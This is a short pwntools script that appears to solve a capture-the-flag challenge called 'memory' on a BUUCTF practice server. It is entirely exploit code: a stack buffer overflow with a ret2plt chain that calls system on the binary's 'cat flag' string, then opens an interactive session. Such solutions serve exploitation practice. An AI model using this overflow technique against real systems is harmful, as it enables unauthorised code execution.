from pwn import *

#context.log_level = 'debug'

#p = process('./memory')
p = remote('node4.buuoj.cn', 28147)
elf = ELF('memory')

system_addr = elf.plt['system']
bin_sh = next(elf.search(b'cat flag'))
main_addr = elf.sym['main']

payload = b'a' * ( 0x13 + 4 ) + p32(system_addr) + p32(main_addr) + p32(bin_sh)

p.sendline(payload)

p.interactive()
